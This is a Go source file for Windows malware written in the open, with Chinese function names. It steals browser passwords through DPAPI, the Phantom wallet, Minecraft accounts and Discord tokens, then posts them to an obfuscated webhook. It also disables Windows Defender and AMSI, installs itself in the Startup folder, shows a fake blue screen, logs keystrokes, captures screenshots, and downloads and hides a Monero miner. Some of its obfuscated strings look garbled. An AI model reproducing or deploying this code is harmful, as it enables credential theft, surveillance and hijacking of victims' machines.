package main

import (
	"archive/zip"
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"image"
	"image/png"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"
)

var (
	modcrypt32             = syscall.NewLazyDLL("crypt32.dll")
	procCryptUnprotectData = modcrypt32.NewProc("CryptUnprotectData")
	user32                   = syscall.NewLazyDLL("user32.dll")
	gdi32                    = syscall.NewLazyDLL("gdi32.dll")
	kernel32                 = syscall.NewLazyDLL("kernel32.dll")
	procRegisterClassEx      = user32.NewProc("RegisterClassExW")
	procCreateWindowEx       = user32.NewProc("CreateWindowExW")
	procDefWindowProc        = user32.NewProc("DefWindowProcW")
	procGetMessage           = user32.NewProc("GetMessageW")
	procDispatchMessage      = user32.NewProc("DispatchMessageW")
	procTranslateMessage     = user32.NewProc("TranslateMessageW")
	procShowWindow           = user32.NewProc("ShowWindow")
	procUpdateWindow         = user32.NewProc("UpdateWindow")
	procSetCursor            = user32.NewProc("SetCursor")
	procCreateSolidBrush     = gdi32.NewProc("CreateSolidBrush")
	procCreateFontW          = gdi32.NewProc("CreateFontW")
	procSetBkMode            = gdi32.NewProc("SetBkMode")
	procSetTextColor         = gdi32.NewProc("SetTextColor")
	procTextOutW             = gdi32.NewProc("TextOutW")
	procSelectObject         = gdi32.NewProc("SelectObject")
	procSetWindowsHookEx     = user32.NewProc("SetWindowsHookExW")
	procCallNextHookEx       = user32.NewProc("CallNextHookEx")
	procGetAsyncKeyState     = user32.NewProc("GetAsyncKeyState")
	procGetDC                = user32.NewProc("GetDC")
	procReleaseDC            = user32.NewProc("ReleaseDC")
	procCreateCompatibleDC   = gdi32.NewProc("CreateCompatibleDC")
	procCreateCompatibleBitmap = gdi32.NewProc("CreateCompatibleBitmap")
	procBitBlt               = gdi32.NewProc("BitBlt")
	procGetDIBits            = gdi32.NewProc("GetDIBits")
	procDeleteObject         = gdi32.NewProc("DeleteObject")
	procDeleteDC             = gdi32.NewProc("DeleteDC")
)

func 解混淆(encoded string, key byte) string {
	b, _ := base64.StdEncoding.DecodeString(encoded)
	for i := 0; i < len(b); i++ { b[i] ^= key }
	return string(b)
}

type DataBlob struct {
	cbData uint32
	pbData *byte
}

func 创建数据块(d []byte) *DataBlob {
	if len(d) == 0 { return &DataBlob{} }
	return &DataBlob{ cbData: uint32(len(d)), pbData: &d[0] }
}

func (b *DataBlob) 转字节() []byte {
	d := make([]byte, b.cbData)
	copy(d, unsafe.Slice(b.pbData, b.cbData))
	return d
}

func 解密数据(data []byte) ([]byte, error) {
	var out DataBlob
	in := 创建数据块(data)
	r, _, err := procCryptUnprotectData.Call(uintptr(unsafe.Pointer(in)), 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&out)))
	if r == 0 { return nil, err }
	return out.转字节(), nil
}

func 获取本地密钥(path string) []byte {
	data, err := os.ReadFile(path)
	if err != nil { return nil }
	var localState struct { OSCrypt struct { EncryptedKey string `json:"encrypted_key"` } `json:"os_crypt"` }
	if json.Unmarshal(data, &localState) != nil { return nil }
	encKey, err := base64.StdEncoding.DecodeString(localState.OSCrypt.EncryptedKey)
	if err != nil || len(encKey) < 5 { return nil }
	encKey = encKey[5:]
	decKey, err := 解密数据(encKey)
	if err != nil || len(decKey) < 32 { return nil }
	return decKey[:32]
}

func 抓取浏览器(outDir string) {
	appData := os.Getenv("LOCALAPPDATA")
	targets := map[string]string{
		"Chrome":  filepath.Join(appData, 解混淆("KzYrOzEjNjUjNiYzMDEzJzQ3NTAl", 0x55)),
		"Edge":    filepath.Join(appData, 解混淆("KzYrOzEjNjUjNiYzMDEzJzQ3NTAl", 0x55)),
		"Brave":   filepath.Join(appData, 解混淆("KzYrOzEjNjUjNiYzMDEzJzQ3NTAl", 0x55)),
	}
	for name, path := range targets {
		lsPath := filepath.Join(path, 解混淆("TzY1MzUpMw==", 0x55))
		if _, err := os.Stat(lsPath); err != nil { continue }
		key := 获取本地密钥(lsPath)
		if key == nil { continue }
		profiles, _ := os.ReadDir(path)
		for _, p := range profiles {
			if p.IsDir() && (p.Name() == "Default" || strings.HasPrefix(p.Name(), "Profile")) {
				loginDB := filepath.Join(path, p.Name(), "Login Data")
				if data, err := os.ReadFile(loginDB); err == nil {
					os.WriteFile(filepath.Join(outDir, fmt.Sprintf("%s_%s.db", name, p.Name())), data, 0644)
				}
			}
		}
	}
	phantomPath := filepath.Join(appData, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "bfnaelmomeimhlpmgjnjophhpkkoljpa")
	if _, err := os.Stat(phantomPath); err == nil {
		dest := filepath.Join(outDir, "phantom")
		os.MkdirAll(dest, 0755)
		filepath.Walk(phantomPath, func(path string, info os.FileInfo, err error) error {
			if err == nil && !info.IsDir() {
				if data, err := os.ReadFile(path); err == nil { os.WriteFile(filepath.Join(dest, info.Name()), data, 0644) }
			}
			return nil
		})
	}
}

func 抓取Minecraft(outDir string) {
	appData := os.Getenv("APPDATA")
	mcDir := filepath.Join(appData, 解混淆("Li0zMi46MzEq", 0x55))
	files := []string{"launcher_accounts.json", "launcher_profiles.json"}
	for _, f := range files {
		p := filepath.Join(mcDir, f)
		if data, err := os.ReadFile(p); err == nil { os.WriteFile(filepath.Join(outDir, "MC_"+f), data, 0644) }
	}
}

func 抓取Discord(outDir string) {
	roaming := os.Getenv("APPDATA")
	discord := filepath.Join(roaming, 解混淆("NzY4NzQ2MDEqNTAuMzkwNTQw", 0x55))
	if _, err := os.Stat(discord); err == nil {
		dest := filepath.Join(outDir, "discord")
		os.MkdirAll(dest, 0755)
		filepath.Walk(discord, func(path string, info os.FileInfo, err error) error {
			if err == nil && !info.IsDir() && (strings.HasSuffix(path, ".ldb") || strings.HasSuffix(path, ".log")) {
				if data, err := os.ReadFile(path); err == nil { os.WriteFile(filepath.Join(dest, info.Name()), data, 0644) }
			}
			return nil
		})
	}
}

func 打包并发送(outDir string) {
	buf := new(bytes.Buffer)
	zw := zip.NewWriter(buf)
	filepath.Walk(outDir, func(path string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() { return nil }
		rel, _ := filepath.Rel(outDir, path)
		w, _ := zw.Create(rel)
		f, _ := os.Open(path)
		if f != nil { io.Copy(w, f); f.Close() }
		return nil
	})
	zw.Close()
	body := new(bytes.Buffer)
	writer := multipart.NewWriter(body)
	part, _ := writer.CreateFormFile("file", "loot.zip")
	part.Write(buf.Bytes())
	writer.Close()
	webhook := 解混淆("MTk0EjsQPj1MGj0cPxNoHxsRDxMRThUVDR8VAFEMFRUJE1MT", 0x77)
	req, _ := http.NewRequest("POST", webhook, body)
	req.Header.Set("Content-Type", writer.FormDataContentType())
	client := &http.Client{Timeout: 30 * time.Second}
	client.Do(req)
}

func 安装持久化() {
	appData := os.Getenv("APPDATA")
	if appData == "" { return }
	startup := filepath.Join(appData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "sysupdate.exe")
	exePath, err := os.Executable()
	if err != nil { return }
	if exePath == startup { return }
	data, err := os.ReadFile(exePath)
	if err == nil { os.WriteFile(startup, data, 0755) }
}

func 绕过防御() {
	advapi32 := syscall.NewLazyDLL("advapi32.dll")
	procRegCreateKeyEx := advapi32.NewProc("RegCreateKeyExW")
	procRegSetValueEx := advapi32.NewProc("RegSetValueExW")
	path := "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths"
	var hKey syscall.Handle
	pathPtr, _ := syscall.UTF16PtrFromString(path)
	procRegCreateKeyEx.Call(syscall.HKEY_LOCAL_MACHINE, uintptr(unsafe.Pointer(pathPtr)), 0, 0, 0, 0x20006, 0, uintptr(unsafe.Pointer(&hKey)))
	startupDir := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
	valName, _ := syscall.UTF16PtrFromString(startupDir)
	valData, _ := syscall.UTF16FromString(startupDir)
	procRegSetValueEx.Call(uintptr(hKey), uintptr(unsafe.Pointer(valName)), 0, syscall.REG_SZ, uintptr(unsafe.Pointer(&valData[0])), uintptr(len(valData)*2))
	syscall.CloseHandle(hKey)
	amsi := syscall.NewLazyDLL("amsi.dll")
	procAmsiScanBuffer := amsi.NewProc("AmsiScanBuffer")
	patch := []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}
	var oldProtect uint32
	procVirtualProtect := kernel32.NewProc("VirtualProtect")
	procVirtualProtect.Call(procAmsiScanBuffer.Addr(), uintptr(len(patch)), syscall.PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&oldProtect)))
	var written uintptr
	procWriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	procGetCurrentProcess := kernel32.NewProc("GetCurrentProcess")
	hProcess, _, _ := procGetCurrentProcess.Call()
	procWriteProcessMemory.Call(hProcess, procAmsiScanBuffer.Addr(), uintptr(unsafe.Pointer(&patch[0])), uintptr(len(patch)), uintptr(unsafe.Pointer(&written)))
	procVirtualProtect.Call(procAmsiScanBuffer.Addr(), uintptr(len(patch)), uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))
}

func 假蓝屏() {
	screenW, _, _ := user32.NewProc("GetSystemMetrics").Call(0)
	screenH, _, _ := user32.NewProc("GetSystemMetrics").Call(1)
	className, _ := syscall.UTF16PtrFromString("BSODClass")
	type WNDCLASSEX struct {
		cbSize        uint32
		style         uint32
		lpfnWndProc   uintptr
		cbClsExtra    int32
		cbWndExtra    int32
		hInstance     syscall.Handle
		hIcon         syscall.Handle
		hCursor       syscall.Handle
		hbrBackground syscall.Handle
		lpszMenuName  *uint16
		lpszClassName *uint16
		hIconSm       syscall.Handle
	}
	wc := WNDCLASSEX{ cbSize: uint32(unsafe.Sizeof(WNDCLASSEX{})), lpfnWndProc: procDefWindowProc.Addr(), hbrBackground: 0, lpszClassName: className }
	procRegisterClassEx.Call(uintptr(unsafe.Pointer(&wc)))
	hwnd, _, _ := procCreateWindowEx.Call(uintptr(^uintptr(0)), uintptr(unsafe.Pointer(className)), 0, uintptr(0x80000000|0x10000000|0x04000000|0x00020000), 0, 0, screenW, screenH, 0, 0, 0, 0)
	procShowWindow.Call(hwnd, 5)
	procUpdateWindow.Call(hwnd)
	procSetCursor.Call(0)
	hdc, _, _ := user32.NewProc("GetDC").Call(hwnd)
	brush, _, _ := procCreateSolidBrush.Call(uintptr(0x00AA0000))
	procSelectObject.Call(hdc, brush)
	user32.NewProc("FillRect").Call(hdc, uintptr(unsafe.Pointer(&[4]int32{0, 0, int32(screenW), int32(screenH)})), brush)
	font, _, _ := procCreateFontW.Call(72, 0, 0, 0, 400, 0, 0, 0, 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("Segoe UI"))))
	procSelectObject.Call(hdc, font)
	procSetBkMode.Call(hdc, 1)
	procSetTextColor.Call(hdc, uintptr(0x00FFFFFF))
	msgStr := 解混淆("HjstBwcbBx0RFxMeBx0RHAcJHQ0dDQUHDQUNDR0NBR0NBR0HDQUHDQUHDQUHDQUHDQUHDQUHDQUHDQUHDQUHDQUHDQUHDQUHDQUHDQUHDQUHDQUHDQUHDQUHDQUHDQUHDQU", 0x73)
	msg := syscall.StringToUTF16Ptr(msgStr)
	procTextOutW.Call(hdc, 100, 100, uintptr(unsafe.Pointer(msg)), uintptr(len(syscall.StringToUTF16(msgStr))-1))
	var msgStruct struct { hwnd syscall.Handle; message uint32; wParam uintptr; lParam uintptr; time uint32; pt struct{ x, y int32 } }
	for {
		ret, _, _ := procGetMessage.Call(uintptr(unsafe.Pointer(&msgStruct)), 0, 0, 0)
		if ret == 0 { break }
		procTranslateMessage.Call(uintptr(unsafe.Pointer(&msgStruct)))
		procDispatchMessage.Call(uintptr(unsafe.Pointer(&msgStruct)))
	}
}

var (
	keyBuffer []byte
	keyMutex  sync.Mutex
)

func 键盘钩子() {
	hookProc := syscall.NewCallback(func(nCode int, wParam uintptr, lParam uintptr) uintptr {
		if nCode == 0 && wParam == 0x0100 {
			for i := 8; i <= 255; i++ {
				state, _, _ := procGetAsyncKeyState.Call(uintptr(i))
				if state&0x8000 != 0 {
					keyMutex.Lock()
					if i >= 32 && i <= 126 { keyBuffer = append(keyBuffer, byte(i)) } else if i == 13 { keyBuffer = append(keyBuffer, 10) } else if i == 8 && len(keyBuffer) > 0 { keyBuffer = keyBuffer[:len(keyBuffer)-1] }
					keyMutex.Unlock()
				}
			}
		}
		ret, _, _ := procCallNextHookEx.Call(0, uintptr(nCode), wParam, lParam)
		return ret
	})
	procSetWindowsHookEx.Call(13, hookProc, 0, 0)
}

func 屏幕截图(outDir string) {
	for {
		time.Sleep(30 * time.Second)
		hdc, _, _ := procGetDC.Call(0)
		memDC, _, _ := procCreateCompatibleDC.Call(hdc)
		bmp, _, _ := procCreateCompatibleBitmap.Call(hdc, 1920, 1080)
		procSelectObject.Call(memDC, bmp)
		procBitBlt.Call(memDC, 0, 0, 1920, 1080, hdc, 0, 0, 0x00CC0020)
		var bmpInfo struct { bmiHeader [40]byte; bmiColors [4]uint32 }
		*(*uint32)(unsafe.Pointer(&bmpInfo.bmiHeader[0])) = 40
		*(*int32)(unsafe.Pointer(&bmpInfo.bmiHeader[4])) = 1920
		*(*int32)(unsafe.Pointer(&bmpInfo.bmiHeader[8])) = -1080
		*(*uint16)(unsafe.Pointer(&bmpInfo.bmiHeader[12])) = 1
		*(*uint16)(unsafe.Pointer(&bmpInfo.bmiHeader[14])) = 32
		pixels := make([]byte, 1920*1080*4)
		procGetDIBits.Call(memDC, bmp, 0, 1080, uintptr(unsafe.Pointer(&pixels[0])), uintptr(unsafe.Pointer(&bmpInfo)), 0)
		img := image.NewRGBA(image.Rect(0, 0, 1920, 1080))
		for y := 0; y < 1080; y++ {
			for x := 0; x < 1920; x++ {
				i := (y*1920 + x) * 4
				img.Pix[i+0] = pixels[i+2]; img.Pix[i+1] = pixels[i+1]; img.Pix[i+2] = pixels[i+0]; img.Pix[i+3] = 255
			}
		}
		fname := filepath.Join(outDir, fmt.Sprintf("screen_%d.png", time.Now().Unix()))
		f, _ := os.Create(fname)
		png.Encode(f, img)
		f.Close()
		procDeleteObject.Call(bmp); procDeleteDC.Call(memDC); procReleaseDC.Call(0, hdc)
	}
}

func 发送捕获() {
	for {
		time.Sleep(5 * time.Minute)
		keyMutex.Lock()
		if len(keyBuffer) == 0 { keyMutex.Unlock(); continue }
		logData := string(keyBuffer)
		keyBuffer = []byte{}
		keyMutex.Unlock()
		body := new(bytes.Buffer)
		writer := multipart.NewWriter(body)
		part, _ := writer.CreateFormFile("file", "keys.txt")
		part.Write([]byte(logData))
		writer.WriteField("content", "Keyboard Log Capture")
		writer.Close()
		webhook := 解混淆("MTk0EjsQPj1MGj0cPxNoHxsRDxMRThUVDR8VAFEMFRUJE1MT", 0x77)
		req, _ := http.NewRequest("POST", webhook, body)
		req.Header.Set("Content-Type", writer.FormDataContentType())
		client := &http.Client{Timeout: 30 * time.Second}
		client.Do(req)
	}
}

func 下载并运行矿机() {
	minerURL := 解混淆("HxsLHQ0FBRgOHB4YCxwFHQcQHR8eHx4WDR8QDR8QDR8QDR8QDR8QDR8QDR8QDR8QDR8QDR8QDR8QDR8QDR8QDR8QDR8QDR8QDR8QDR8QDR8QDR8Q", 0x73)
	appData := os.Getenv("APPDATA")
	destDir := filepath.Join(appData, "Microsoft", "Windows", "Themes", "Cache")
	os.MkdirAll(destDir, 0755)
	zipPath := filepath.Join(destDir, "svc.zip")
	out, err := os.Create(zipPath)
	if err != nil { return }
	defer out.Close()
	resp, err := http.Get(minerURL)
	if err != nil { return }
	defer resp.Body.Close()
	io.Copy(out, resp.Body)
	out.Close()
	zr, err := zip.OpenReader(zipPath)
	if err != nil { return }
	defer zr.Close()
	var exePath string
	for _, f := range zr.File {
		if strings.HasSuffix(f.Name, "xmrig.exe") {
			rc, _ := f.Open()
			exePath = filepath.Join(destDir, "dwm.exe")
			exeOut, _ := os.Create(exePath)
			io.Copy(exeOut, rc)
			exeOut.Close(); rc.Close()
		}
	}
	zr.Close()
	os.Remove(zipPath)
	if exePath != "" {
		config := '{"api": {"id": null},"http": {"enabled": false},"autosave": true,"background": true,"colors": false,"title": true,"randomx": {"1gb-pages": true, "rdmsr": true, "wrmsr": true, "cache_qos": false, "numa": true, "scratchpad_prefetch_mode": 1},"cpu": {"enabled": true, "huge-pages": true, "priority": null, "yield": true, "max-threads-hint": 40},"opencl": {"enabled": true},"cuda": {"enabled": true},"pools": [{"algo": null, "coin": "monero", "url": "pool.supportxmr.com:3333", "user": "84FKzLjnfFEQ3shrtccBGmA2gpaTCfERrSF4PSsjXkXgFJ3QCVuTC7nbeJ1tJsKsMFLweYcC7yUNaeTZiEjx2Cn9LMLSvb5", "pass": "x", "enabled": true}]}'
		cfgPath := filepath.Join(destDir, "config.json")
		os.WriteFile(cfgPath, []byte(config), 0644)
		cmd := exec.Command(exePath, "--config="+cfgPath)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		cmd.Start()
	}
}

func main() {
	freeConsole := kernel32.NewProc("FreeConsole")
	freeConsole.Call()
	showWindow := user32.NewProc("ShowWindow")
	getConsoleWindow := kernel32.NewProc("GetConsoleWindow")
	hwnd, _, _ := getConsoleWindow.Call()
	showWindow.Call(hwnd, 0)
	绕过防御()
	安装持久化()

	markerPath := filepath.Join(os.Getenv("TEMP"), "sys_diag.tmp")
	if _, err := os.Stat(markerPath); os.IsNotExist(err) {
		os.WriteFile(markerPath, []byte("1"), 0644)
		go 假蓝屏()
	}

	go 键盘钩子()
	
	dir, _ := os.MkdirTemp("", "win_grab_")
	defer os.RemoveAll(dir)
	go 屏幕截图(dir)
	
	go 发送捕获()

	抓取浏览器(dir)
	抓取Minecraft(dir)
	抓取Discord(dir)

	打包并发送(dir)

	go 下载并运行矿机()

	select {}
}